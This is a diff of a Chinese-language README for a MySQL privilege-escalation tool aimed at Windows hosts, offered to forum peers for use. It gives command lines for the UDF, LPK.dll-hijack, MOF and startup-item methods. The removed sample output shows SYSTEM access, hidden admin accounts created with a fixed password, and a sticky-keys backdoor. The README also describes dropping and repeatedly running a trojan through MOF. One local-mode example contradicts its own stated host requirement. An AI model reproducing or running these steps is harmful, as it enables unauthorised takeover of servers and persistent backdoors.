@@ -1,58 +1,73 @@
 # python-promoting-privileges
+
 1.自动导出mof文件，
 
 2.自动判断mysql版本，根据版本不同导出UDF的DLL到不同目录，UDF提权
 
 3.导出LPK.dll文件，劫持系统目录提权
 
-4.写启动项有问题，已经注释掉 
-#usage:
-```python sec.py host port user pass```
+4.写启动项提权 
 
-#Response:
+工具仅做方便使用，技术含量几乎没有。
+
+用py脚本写的，也打包成exe了，个人用的还算顺手。
+
+用法：
+
+![Alt text](./pic/vashvJHVAJSHVCJHavj.png)
+
+我在虚拟机演示打包好的exe远程提权，坛子的老哥们都是明白人，我就不多说了，直接上图：
+
+默认UDF提权，也可以`-m udf`指定方式，`-e ipconfig`指定执行的cmd，默认执行whoami：
 ```
-Last login: Wed Jul 6 17:13:31 on ttys001
-BinghedeMac:~ BingheSec$ python /sec.py 192.168.1.10 3306 root root
-
- ===============================================================================
-|                                                                               |
-|                BingheSec Mysql Promote Privileges Tool                        |
-|                                                                               |
- ===============================================================================
-Usage as: sec.py host port user pass
-Example: sec.py 192.168.1.6 3306 root 123456
-Current connection: 192.168.1.10:3306/root/root
-Mysql Version is 5.5.40
-Mysql Version>5.0 , UDF dll can only dump to plugin dir!
-Mysql RootPath : C:/Program Files/phpStudy/MySQL/
-UDF DLL PATH : C:/Program Files/phpStudy/MySQL/lib/plugin/BingheSec.dll
-
-UDf will make the user 'guest' active and add to admin with the pass 789456123+abc
-The sql of Dumping AddUser And AddToAdmin MOF File has queried OK.
-Press shift 5 times then press 1,2 at the same time to start the lpk UI,pass:binghesec
-Mof and LPK will add users named BingheSec$/admin$ with password: 789456123+abc
-Mof file only fit for windows2003 , please test it byourself!
-Command Query Result:
--------------------------------------------------------------------------------
-
-Microsoft Windows [版本 5.2.3790]
-nt authority\system
-命令成功完成。
-
-命令成功完成。
-
-命令成功完成。
-
-别名 administrators
-注释 管理员对计算机/域有不受限制的完全访问权
-
-成员
-
--------------------------------------------------------------------------------
-
-admin$
-Administrator
-BingheSec$
-Guest
-命令成功完成。
+root.exe -a 192.168.1.105 -p root -e "ver&whoami" -m udf
 ```
+
+![Alt text](./pic/jhfashvhavha.png)
+
+有时候UDF无效，我们使用LPK.dll劫持：
+
+```
+root.exe -a 192.168.1.105 -p root -m lpk
+```
+
+![Alt text](./hasjhvjhas.png)
+
+验证一下lpk是否加上账户:
+
+![Alt text](./hbashjvchjasvh.png)
+
+有时候UDF和LPK都无效，目标是windows2003，还有机会，可以MOF：
+
+把你的木马的hex复制到同目录的hex.txt就行了，程序会导出木马到指定目录，并用mof执行。
+
+![Alt text](./avavJHdaHjadkj.png)
+
+每隔几秒就运行一次木马，有点尴尬，如何停止mof老司机都知道，我就不多说了。
+
+![Alt text](./hbajhvjhasJdavkjdJBAS.png)
+
+有时候UDF和LPK都无效，那我们只能尝试被动写启动项：
+
+```
+root.exe -a 192.168.1.105 -p root -m st
+```
+![Alt text](./jvaJHVJC.png)
+
+可能存在路径编码问题写不成功，你可以根据提示，用本地的MySQL连接上去，执行。
+
+![Alt text](./vqfjhvajshcvasnCAKQJ.png)
+
+当然还有情况是远程提权，UDF不能创建plugin目录，网上流传的ADS流创建目录我是没有成功过，工具里加了ADS流创建目录的代码，那么我们删掉plugin目录，再远程试试：
+
+![Alt text](./jhvcajhvhacsHGXCfxafxG.png)
+
+如上图，那就不行了，那么这种情况下，如果你有shell，在shell里的本地模式执行，就不一样了。
+
+本地模式：
+一般来说，php一般权限都是可以创建目录的，此处必须指定主机为`localhost或127.0.0.1`才会调用本地模式：
+```
+root.exe -a 192.168.1.105 -p root -e "ver&whoami" -m udf
+```
+
+![Alt text](./jqwhvdqhvhavshHHVJHV.png)
